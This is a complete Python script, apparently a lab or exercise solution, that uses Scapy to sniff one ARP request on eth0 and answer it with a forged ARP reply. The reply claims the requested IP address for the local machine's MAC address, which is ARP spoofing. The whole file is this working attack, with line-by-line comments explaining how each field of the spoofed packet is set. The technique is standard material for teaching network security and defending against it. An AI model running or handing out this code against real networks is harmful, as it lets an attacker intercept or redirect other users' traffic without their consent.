#!/usr/bin/python3
from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 ip
ipaddr = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
# Our eth0 mac address
macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

def handle_arp_packets(packet):
    # if arp request, then we need to fill this out to send back our mac as the response
    if ARP in packet and packet[ARP].op == 1:
        # Construct the ARP response packet
        # Fill in the OSI layer 2 packet details (i.e. Ethernet)
        ether_resp = Ether(dst=packet.src,          # Ethernet destination MAC address is the one of the requesting party
                           type=0x806,              # Ethernet type for ARP is 0x806
                           src=macaddr)             # Ethernet source MAC-address is our own MAC-address

        # Fill in the OSI layer 3 packet details (i.e. ARP)
        arp_response = ARP(pdst=packet[ARP].psrc)   # The ARP-response's destination IP-address is the one of the requesting party
        arp_response.op = 2                         # opcode = 2 (reply)
        arp_response.plen = 4                       # Protocol size = 4
        arp_response.hwlen = 6                      # Hardware size = 6
        arp_response.ptype = 0x800                  # Protocol type = IPv4 (0x800)
        arp_response.hwtype = 0x1                   # Hardware type = Ethernet (1)
        arp_response.hwsrc = macaddr                # Set the hwsrc to our own MAC address
        arp_response.psrc = packet[ARP].pdst        # Set the IP-address to the one we're trying to spoof
                                                    # i.e. the IP-address in the ARP-request
        arp_response.hwdst = packet[ARP].hwsrc      # The ARP-response should be sent to the requester's MAC-address
        arp_response.pdst = packet[ARP].psrc        # The ARP-response should be sent to the requester's IP-address
        response = ether_resp/arp_response
        sendp(response, iface="eth0")

def main():
    # We only want arp requests
    berkeley_packet_filter = "(arp[6:2] = 1)"
    # sniffing for one packet that will be sent to a function, while storing none
    sniff(filter=berkeley_packet_filter, prn=handle_arp_packets, store=0, count=1)

if __name__ == "__main__":
    main()